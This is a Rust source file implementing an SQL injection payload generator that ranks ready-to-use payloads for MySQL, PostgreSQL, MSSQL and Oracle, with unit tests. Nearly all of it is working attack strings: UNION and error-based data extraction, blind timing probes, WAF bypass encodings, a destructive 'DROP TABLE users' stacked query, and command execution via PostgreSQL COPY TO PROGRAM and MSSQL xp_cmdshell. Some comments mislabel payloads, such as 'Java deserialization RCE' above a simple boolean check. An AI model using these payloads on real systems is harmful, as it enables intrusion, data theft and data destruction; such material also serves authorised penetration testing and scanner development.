// Advanced SQLi Payload Generation - Database-specific techniques
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqliPayload {
    pub payload: String,
    pub dbms: Vec<String>,
    pub technique: String,
    pub category: PayloadCategory,
    pub difficulty: u8, // 1-10
    pub priority: f64,  // 0.0-1.0
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum PayloadCategory {
    BasicInjection,
    UnionSelect,
    ErrorBased,
    BlindBoolean,
    BlindTime,
    StackedQueries,
    WafBypass,
    OutOfBand,
}

pub struct SqliPayloadGenerator;

impl SqliPayloadGenerator {
    /// Generate all SQLi payloads for all databases
    pub fn generate_all_payloads() -> Vec<SqliPayload> {
        let mut payloads = Vec::new();

        // MySQL payloads
        payloads.extend(Self::mysql_payloads());

        // PostgreSQL payloads
        payloads.extend(Self::postgresql_payloads());

        // MSSQL payloads
        payloads.extend(Self::mssql_payloads());

        // Oracle payloads
        payloads.extend(Self::oracle_payloads());

        // Generic payloads
        payloads.extend(Self::generic_payloads());

        // WAF bypass payloads
        payloads.extend(Self::waf_bypass_payloads());

        payloads.sort_by(|a, b| b.priority.partial_cmp(&a.priority).unwrap());
        payloads
    }

    fn mysql_payloads() -> Vec<SqliPayload> {
        vec![
            // UNION-based
            SqliPayload {
                payload: "' UNION SELECT database(),user(),version(),4,5--".to_string(),
                dbms: vec!["MySQL".to_string(), "MariaDB".to_string()],
                technique: "UNION-based".to_string(),
                category: PayloadCategory::UnionSelect,
                difficulty: 2,
                priority: 0.95,
                description: "Extract database name, user, and version".to_string(),
            },
            SqliPayload {
                payload: "' UNION SELECT GROUP_CONCAT(table_name),2,3,4,5 FROM information_schema.tables WHERE table_schema=database()--".to_string(),
                dbms: vec!["MySQL".to_string(), "MariaDB".to_string()],
                technique: "UNION-based".to_string(),
                category: PayloadCategory::UnionSelect,
                difficulty: 3,
                priority: 0.92,
                description: "Enumerate all table names in database".to_string(),
            },
            // Error-based
            SqliPayload {
                payload: "' AND extractvalue(1,concat(0x7e,version()))--".to_string(),
                dbms: vec!["MySQL".to_string(), "MariaDB".to_string()],
                technique: "Error-based".to_string(),
                category: PayloadCategory::ErrorBased,
                difficulty: 2,
                priority: 0.90,
                description: "Extract version via XML function error".to_string(),
            },
            SqliPayload {
                payload: "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--".to_string(),
                dbms: vec!["MySQL".to_string(), "MariaDB".to_string()],
                technique: "Error-based".to_string(),
                category: PayloadCategory::ErrorBased,
                difficulty: 2,
                priority: 0.88,
                description: "Extract current user via updatexml".to_string(),
            },
            SqliPayload {
                payload: "' AND ST_LatFromGeoHash((SELECT concat(0x7e,database())),1)--".to_string(),
                dbms: vec!["MySQL".to_string()],
                technique: "Error-based".to_string(),
                category: PayloadCategory::ErrorBased,
                difficulty: 3,
                priority: 0.85,
                description: "GIS function error extraction".to_string(),
            },
            // Boolean-based
            SqliPayload {
                payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--".to_string(),
                dbms: vec!["MySQL".to_string(), "MariaDB".to_string()],
                technique: "Time-based blind".to_string(),
                category: PayloadCategory::BlindTime,
                difficulty: 3,
                priority: 0.88,
                description: "Time-based blind SQLi via SLEEP".to_string(),
            },
            // Stacked queries
            SqliPayload {
                payload: "'; DROP TABLE users;--".to_string(),
                dbms: vec!["MySQL".to_string(), "MariaDB".to_string()],
                technique: "Stacked queries".to_string(),
                category: PayloadCategory::StackedQueries,
                difficulty: 4,
                priority: 0.75,
                description: "Drop table via stacked query".to_string(),
            },
        ]
    }

    fn postgresql_payloads() -> Vec<SqliPayload> {
        vec![
            // UNION-based
            SqliPayload {
                payload: "' UNION SELECT current_database(),current_user,version(),4,5--".to_string(),
                dbms: vec!["PostgreSQL".to_string()],
                technique: "UNION-based".to_string(),
                category: PayloadCategory::UnionSelect,
                difficulty: 2,
                priority: 0.93,
                description: "Extract database, user, and version".to_string(),
            },
            // Error-based
            SqliPayload {
                payload: "' AND CAST(CHAR(67)||CHAR(72)||CHAR(69)||CHAR(67)||CHAR(75) AS INT)--".to_string(),
                dbms: vec!["PostgreSQL".to_string()],
                technique: "Error-based".to_string(),
                category: PayloadCategory::ErrorBased,
                difficulty: 3,
                priority: 0.87,
                description: "Type casting error extraction".to_string(),
            },
            // Copy function (file read)
            SqliPayload {
                payload: "'; COPY (SELECT '') TO PROGRAM 'id';--".to_string(),
                dbms: vec!["PostgreSQL".to_string()],
                technique: "RCE via COPY".to_string(),
                category: PayloadCategory::StackedQueries,
                difficulty: 4,
                priority: 0.80,
                description: "Remote code execution via COPY function".to_string(),
            },
            // Time-based
            SqliPayload {
                payload: "' AND pg_sleep(5)--".to_string(),
                dbms: vec!["PostgreSQL".to_string()],
                technique: "Time-based blind".to_string(),
                category: PayloadCategory::BlindTime,
                difficulty: 2,
                priority: 0.89,
                description: "Time-based blind via pg_sleep".to_string(),
            },
        ]
    }

    fn mssql_payloads() -> Vec<SqliPayload> {
        vec![
            // UNION-based
            SqliPayload {
                payload: "' UNION SELECT @@servername,@@version,user_name(),database(),5--".to_string(),
                dbms: vec!["MSSQL".to_string()],
                technique: "UNION-based".to_string(),
                category: PayloadCategory::UnionSelect,
                difficulty: 2,
                priority: 0.91,
                description: "Extract server name, version, user, database".to_string(),
            },
            // Error-based
            SqliPayload {
                payload: "' AND CAST((SELECT @@version) AS INT)--".to_string(),
                dbms: vec!["MSSQL".to_string()],
                technique: "Error-based".to_string(),
                category: PayloadCategory::ErrorBased,
                difficulty: 2,
                priority: 0.88,
                description: "Type conversion error extraction".to_string(),
            },
            // Time-based
            SqliPayload {
                payload: "' AND WAITFOR DELAY '00:00:05'--".to_string(),
                dbms: vec!["MSSQL".to_string()],
                technique: "Time-based blind".to_string(),
                category: PayloadCategory::BlindTime,
                difficulty: 2,
                priority: 0.90,
                description: "Time-based blind via WAITFOR".to_string(),
            },
            // Stacked queries with xp_cmdshell
            SqliPayload {
                payload: "'; EXEC xp_cmdshell 'whoami';--".to_string(),
                dbms: vec!["MSSQL".to_string()],
                technique: "RCE via xp_cmdshell".to_string(),
                category: PayloadCategory::StackedQueries,
                difficulty: 5,
                priority: 0.82,
                description: "Remote code execution via xp_cmdshell".to_string(),
            },
        ]
    }

    fn oracle_payloads() -> Vec<SqliPayload> {
        vec![
            // UNION-based
            SqliPayload {
                payload: "' UNION SELECT banner,user,table_name,4,5 FROM v$version,dba_tables--".to_string(),
                dbms: vec!["Oracle".to_string()],
                technique: "UNION-based".to_string(),
                category: PayloadCategory::UnionSelect,
                difficulty: 3,
                priority: 0.89,
                description: "Extract version and table information".to_string(),
            },
            // Time-based
            SqliPayload {
                payload: "' AND DBMS_LOCK.SLEEP(5)--".to_string(),
                dbms: vec!["Oracle".to_string()],
                technique: "Time-based blind".to_string(),
                category: PayloadCategory::BlindTime,
                difficulty: 2,
                priority: 0.87,
                description: "Time-based blind via DBMS_LOCK".to_string(),
            },
            // Java deserialization RCE
            SqliPayload {
                payload: "' AND (SELECT COUNT(*) FROM dual WHERE ROWNUM=1)--".to_string(),
                dbms: vec!["Oracle".to_string()],
                technique: "Blind enumeration".to_string(),
                category: PayloadCategory::BlindBoolean,
                difficulty: 3,
                priority: 0.78,
                description: "Boolean-based blind detection".to_string(),
            },
        ]
    }

    fn generic_payloads() -> Vec<SqliPayload> {
        vec![
            // Basic injection
            SqliPayload {
                payload: "' OR '1'='1".to_string(),
                dbms: vec!["MySQL".to_string(), "PostgreSQL".to_string(), "MSSQL".to_string(), "Oracle".to_string()],
                technique: "Basic injection".to_string(),
                category: PayloadCategory::BasicInjection,
                difficulty: 1,
                priority: 0.85,
                description: "Simple OR 1=1 injection".to_string(),
            },
            SqliPayload {
                payload: "1' AND '1'='1".to_string(),
                dbms: vec!["MySQL".to_string(), "PostgreSQL".to_string(), "MSSQL".to_string(), "Oracle".to_string()],
                technique: "Basic injection".to_string(),
                category: PayloadCategory::BasicInjection,
                difficulty: 1,
                priority: 0.84,
                description: "AND 1=1 injection".to_string(),
            },
            // Comment variations
            SqliPayload {
                payload: "' OR 1=1 --".to_string(),
                dbms: vec!["MySQL".to_string(), "PostgreSQL".to_string(), "MSSQL".to_string()],
                technique: "Comment injection".to_string(),
                category: PayloadCategory::BasicInjection,
                difficulty: 1,
                priority: 0.80,
                description: "Injection with SQL comment".to_string(),
            },
            SqliPayload {
                payload: "' OR 1=1 /*".to_string(),
                dbms: vec!["MySQL".to_string(), "PostgreSQL".to_string()],
                technique: "Comment injection".to_string(),
                category: PayloadCategory::BasicInjection,
                difficulty: 1,
                priority: 0.79,
                description: "Injection with C-style comment".to_string(),
            },
        ]
    }

    fn waf_bypass_payloads() -> Vec<SqliPayload> {
        vec![
            // Comment bypass
            SqliPayload {
                payload: "1' /*!50000UNION*/ SELECT NULL,NULL,NULL--".to_string(),
                dbms: vec!["MySQL".to_string(), "MariaDB".to_string()],
                technique: "WAF bypass".to_string(),
                category: PayloadCategory::WafBypass,
                difficulty: 3,
                priority: 0.72,
                description: "Bypass via MySQL version-specific comment".to_string(),
            },
            // Whitespace bypass
            SqliPayload {
                payload: "1'%09UNION%09SELECT%09NULL--".to_string(),
                dbms: vec!["MySQL".to_string(), "PostgreSQL".to_string()],
                technique: "WAF bypass".to_string(),
                category: PayloadCategory::WafBypass,
                difficulty: 2,
                priority: 0.70,
                description: "Bypass via tab character encoding".to_string(),
            },
            // Case variation
            SqliPayload {
                payload: "1' UnIoN SeLeCt NULL--".to_string(),
                dbms: vec!["MySQL".to_string(), "MSSQL".to_string()],
                technique: "WAF bypass".to_string(),
                category: PayloadCategory::WafBypass,
                difficulty: 1,
                priority: 0.65,
                description: "Bypass via case manipulation".to_string(),
            },
            // Double encoding bypass
            SqliPayload {
                payload: "1' %25%37%34UNION%25%37%35 SELECT%25%32%30NULL--".to_string(),
                dbms: vec!["MySQL".to_string(), "PostgreSQL".to_string()],
                technique: "WAF bypass".to_string(),
                category: PayloadCategory::WafBypass,
                difficulty: 3,
                priority: 0.68,
                description: "Bypass via double URL encoding".to_string(),
            },
            // Null byte bypass
            SqliPayload {
                payload: "1'\x00 UNION SELECT NULL--".to_string(),
                dbms: vec!["MySQL".to_string()],
                technique: "WAF bypass".to_string(),
                category: PayloadCategory::WafBypass,
                difficulty: 2,
                priority: 0.60,
                description: "Bypass via null byte injection".to_string(),
            },
        ]
    }

    /// Get payloads for specific database
    pub fn payloads_for_dbms(dbms: &str) -> Vec<SqliPayload> {
        Self::generate_all_payloads()
            .into_iter()
            .filter(|p| p.dbms.iter().any(|d| d.to_lowercase() == dbms.to_lowercase()))
            .collect()
    }

    /// Get payloads by category
    pub fn payloads_by_category(category: PayloadCategory) -> Vec<SqliPayload> {
        Self::generate_all_payloads()
            .into_iter()
            .filter(|p| format!("{:?}", p.category) == format!("{:?}", category))
            .collect()
    }

    /// Get top N payloads by priority
    pub fn top_payloads(count: usize) -> Vec<SqliPayload> {
        let mut payloads = Self::generate_all_payloads();
        payloads.truncate(count);
        payloads
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_all_payloads() {
        let payloads = SqliPayloadGenerator::generate_all_payloads();
        assert!(payloads.len() >= 25);
    }

    #[test]
    fn test_mysql_payloads() {
        let payloads = SqliPayloadGenerator::mysql_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.dbms.contains(&"MySQL".to_string())));
    }

    #[test]
    fn test_payloads_for_dbms() {
        let payloads = SqliPayloadGenerator::payloads_for_dbms("MySQL");
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.dbms.iter().any(|d| d.contains("MySQL"))));
    }

    #[test]
    fn test_top_payloads() {
        let payloads = SqliPayloadGenerator::top_payloads(5);
        assert_eq!(payloads.len(), 5);
        // Check sorted by priority
        for i in 0..payloads.len() - 1 {
            assert!(payloads[i].priority >= payloads[i + 1].priority);
        }
    }

    #[test]
    fn test_payload_difficulty() {
        let payloads = SqliPayloadGenerator::generate_all_payloads();
        for payload in payloads {
            assert!(payload.difficulty >= 1 && payload.difficulty <= 10);
            assert!(payload.priority >= 0.0 && payload.priority <= 1.0);
        }
    }

    #[test]
    fn test_union_payloads_exist() {
        let payloads = SqliPayloadGenerator::generate_all_payloads();
        assert!(payloads.iter().any(|p| p.technique.contains("UNION")));
    }

    #[test]
    fn test_waf_bypass_payloads() {
        let payloads = SqliPayloadGenerator::waf_bypass_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.category == PayloadCategory::WafBypass));
    }
}
